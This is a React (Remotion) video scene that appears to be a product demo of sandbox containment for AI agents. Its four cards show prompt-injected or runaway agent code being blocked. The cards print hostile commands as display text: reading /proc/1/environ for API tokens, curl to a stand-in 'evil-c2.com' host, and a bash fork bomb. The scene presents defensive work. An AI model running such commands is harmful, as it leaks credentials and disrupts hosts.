import React from "react";
import {
  Audio,
  interpolate,
  spring,
  staticFile,
  useCurrentFrame,
  useVideoConfig,
} from "remotion";
import { Subtitle } from "./Subtitle";

export const Phase4Containment: React.FC = () => {
  const frame = useCurrentFrame();
  const { fps } = useVideoConfig();

  const attack1 = spring({ frame: frame - 15, fps, config: { damping: 14 } });
  const attack2 = spring({ frame: frame - 65, fps, config: { damping: 14 } });
  const attack3 = spring({ frame: frame - 115, fps, config: { damping: 14 } });
  const attack4 = spring({ frame: frame - 165, fps, config: { damping: 14 } });

  return (
    <div
      style={{
        width: "100%",
        height: "100%",
        backgroundColor: "#0d1b14",
        backgroundImage:
          "radial-gradient(circle at 50% 30%, rgba(34, 197, 94, 0.18) 0%, transparent 70%)",
        color: "#ffffff",
        fontFamily: "'Inter', system-ui, -apple-system, sans-serif",
        position: "relative",
        padding: "60px 80px",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        boxSizing: "border-box",
        overflow: "hidden",
      }}
    >
      <Audio src={staticFile("voice_phase4.wav")} />
      <Audio src={staticFile("shield_on.wav")} volume={0.2} />

      {/* Top Header Badge */}
      <div
        style={{
          display: "flex",
          alignItems: "center",
          gap: 12,
          padding: "8px 26px",
          borderRadius: 999,
          backgroundColor: "rgba(34, 197, 94, 0.15)",
          border: "1px solid rgba(34, 197, 94, 0.4)",
          marginBottom: 20,
        }}
      >
        <span
          style={{
            width: 8,
            height: 8,
            borderRadius: "50%",
            backgroundColor: "#22c55e",
            boxShadow: "0 0 10px #22c55e",
          }}
        />
        <span
          style={{
            fontSize: 16,
            fontWeight: 800,
            letterSpacing: "0.08em",
            textTransform: "uppercase",
            color: "#86efac",
          }}
        >
          Challenge 1 · Live Containment Moments (Attack Lab)
        </span>
      </div>

      <h1
        style={{
          fontSize: 52,
          fontWeight: 850,
          margin: "0 0 36px 0",
          letterSpacing: "-0.02em",
          textAlign: "center",
        }}
      >
        Kernel-Enforced Defenses Against <span style={{ color: "#4ade80" }}>Live Attacks</span>
      </h1>

      {/* 4 Containment Moments Grid */}
      <div
        style={{
          display: "grid",
          gridTemplateColumns: "repeat(2, 1fr)",
          gap: 24,
          width: "100%",
          maxWidth: 1450,
        }}
      >
        {/* Moment 1 */}
        <div
          style={{
            padding: 26,
            borderRadius: 20,
            backgroundColor: "rgba(18, 38, 28, 0.9)",
            border: "1.5px solid rgba(34, 197, 94, 0.4)",
            boxShadow: "0 12px 28px rgba(0,0,0,0.4)",
            opacity: attack1,
            transform: `translateY(${(1 - attack1) * 30}px)`,
          }}
        >
          <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 10 }}>
            <span style={{ fontSize: 13, fontWeight: 800, color: "#86efac" }}>CONTAINMENT MOMENT 1</span>
            <span style={{ padding: "4px 10px", borderRadius: 8, backgroundColor: "rgba(34, 197, 94, 0.2)", color: "#4ade80", fontWeight: 800, fontSize: 12 }}>
              ✓ ZERO SECRET LEAKAGE
            </span>
          </div>
          <h3 style={{ fontSize: 21, margin: "0 0 8px 0" }}>Secret Exfiltration Attack</h3>
          <p style={{ fontSize: 14, color: "#cbd5e1", margin: "0 0 10px 0" }}>
            Prompt-injected code runs <code>cat /proc/1/environ</code> to steal cloud API tokens.
          </p>
          <div style={{ padding: "8px 14px", borderRadius: 10, backgroundColor: "#09140f", fontFamily: "monospace", fontSize: 13, color: "#86efac" }}>
            Result: environment={"{"}{"}"} → 0 credentials exposed
          </div>
        </div>

        {/* Moment 2 */}
        <div
          style={{
            padding: 26,
            borderRadius: 20,
            backgroundColor: "rgba(18, 38, 28, 0.9)",
            border: "1.5px solid rgba(34, 197, 94, 0.4)",
            boxShadow: "0 12px 28px rgba(0,0,0,0.4)",
            opacity: attack2,
            transform: `translateY(${(1 - attack2) * 30}px)`,
          }}
        >
          <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 10 }}>
            <span style={{ fontSize: 13, fontWeight: 800, color: "#86efac" }}>CONTAINMENT MOMENT 2</span>
            <span style={{ padding: "4px 10px", borderRadius: 8, backgroundColor: "rgba(34, 197, 94, 0.2)", color: "#4ade80", fontWeight: 800, fontSize: 12 }}>
              ✓ NETWORK DROPPED
            </span>
          </div>
          <h3 style={{ fontSize: 21, margin: "0 0 8px 0" }}>Command & Control Egress</h3>
          <p style={{ fontSize: 14, color: "#cbd5e1", margin: "0 0 10px 0" }}>
            Malicious script attempts outbound exfiltration to <code>curl https://evil-c2.com</code>.
          </p>
          <div style={{ padding: "8px 14px", borderRadius: 10, backgroundColor: "#09140f", fontFamily: "monospace", fontSize: 13, color: "#86efac" }}>
            Result: network_mode="none" → Kernel drops all egress packets
          </div>
        </div>

        {/* Moment 3 */}
        <div
          style={{
            padding: 26,
            borderRadius: 20,
            backgroundColor: "rgba(18, 38, 28, 0.9)",
            border: "1.5px solid rgba(34, 197, 94, 0.4)",
            boxShadow: "0 12px 28px rgba(0,0,0,0.4)",
            opacity: attack3,
            transform: `translateY(${(1 - attack3) * 30}px)`,
          }}
        >
          <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 10 }}>
            <span style={{ fontSize: 13, fontWeight: 800, color: "#86efac" }}>CONTAINMENT MOMENT 3</span>
            <span style={{ padding: "4px 10px", borderRadius: 8, backgroundColor: "rgba(34, 197, 94, 0.2)", color: "#4ade80", fontWeight: 800, fontSize: 12 }}>
              ✓ PID LIMIT ENFORCED
            </span>
          </div>
          <h3 style={{ fontSize: 21, margin: "0 0 8px 0" }}>Fork Bomb DoS Attempt</h3>
          <p style={{ fontSize: 14, color: "#cbd5e1", margin: "0 0 10px 0" }}>
            Runaway agent triggers nested subshell fork bomb <code>:(){"{"}:|:&{"}"};:</code>.
          </p>
          <div style={{ padding: "8px 14px", borderRadius: 10, backgroundColor: "#09140f", fontFamily: "monospace", fontSize: 13, color: "#86efac" }}>
            Result: cgroup pids_limit=128 halts recursion without host impact
          </div>
        </div>

        {/* Moment 4 */}
        <div
          style={{
            padding: 26,
            borderRadius: 20,
            backgroundColor: "rgba(18, 38, 28, 0.9)",
            border: "1.5px solid rgba(34, 197, 94, 0.4)",
            boxShadow: "0 12px 28px rgba(0,0,0,0.4)",
            opacity: attack4,
            transform: `translateY(${(1 - attack4) * 30}px)`,
          }}
        >
          <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 10 }}>
            <span style={{ fontSize: 13, fontWeight: 800, color: "#86efac" }}>CONTAINMENT MOMENT 4</span>
            <span style={{ padding: "4px 10px", borderRadius: 8, backgroundColor: "rgba(34, 197, 94, 0.2)", color: "#4ade80", fontWeight: 800, fontSize: 12 }}>
              ✓ READ-ONLY ROOTFS
            </span>
          </div>
          <h3 style={{ fontSize: 21, margin: "0 0 8px 0" }}>Filesystem Mutation Tampering</h3>
          <p style={{ fontSize: 14, color: "#cbd5e1", margin: "0 0 10px 0" }}>
            Agent script attempts to write to root or modify system binary libraries.
          </p>
          <div style={{ padding: "8px 14px", borderRadius: 10, backgroundColor: "#09140f", fontFamily: "monospace", fontSize: 13, color: "#86efac" }}>
            Result: ReadonlyRootfs=True → Read-only file system (errno 30)
          </div>
        </div>
      </div>

      {/* Verified Cryptographic Containment Receipt Banner */}
      {frame > 540 && (
        <div
          style={{
            position: "absolute",
            bottom: 150,
            backgroundColor: "rgba(10, 25, 18, 0.95)",
            border: "1.5px solid #22c55e",
            borderRadius: 18,
            padding: "16px 36px",
            display: "flex",
            alignItems: "center",
            gap: 24,
            boxShadow: "0 20px 50px rgba(0,0,0,0.8), 0 0 40px rgba(34,197,94,0.25)",
            opacity: spring({ frame: frame - 540, fps, config: { damping: 14 } }),
            transform: `translateY(${(1 - spring({ frame: frame - 540, fps, config: { damping: 14 } })) * 30}px)`,
          }}
        >
          <div
            style={{
              width: 44,
              height: 44,
              borderRadius: "50%",
              backgroundColor: "rgba(34, 197, 94, 0.2)",
              border: "1.5px solid #22c55e",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              color: "#4ade80",
              fontWeight: 900,
              fontSize: 20,
            }}
          >
            ✓
          </div>
          <div>
            <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
              <span style={{ fontSize: 12, fontWeight: 900, color: "#4ade80", letterSpacing: "0.08em" }}>
                CHALLENGE 1 VERIFIED · ZERO LEAKAGE AUDIT
              </span>
              <span style={{ fontSize: 11, padding: "2px 8px", borderRadius: 4, backgroundColor: "rgba(34, 197, 94, 0.25)", color: "#86efac", fontFamily: "monospace" }}>
                RECEIPT SHA-256: af0d03b56bbe0a1a...
              </span>
            </div>
            <div style={{ fontSize: 16, fontWeight: 700, color: "#ffffff", marginTop: 4 }}>
              All 4 live attack vectors blocked deterministically by host kernel sandboxing
            </div>
          </div>
        </div>
      )}

      <Subtitle text="In Challenge 1, Latch demonstrates deterministic containment against live attacks: zero secret leaks, zero network egress, and PID limits." />
    </div>
  );
};

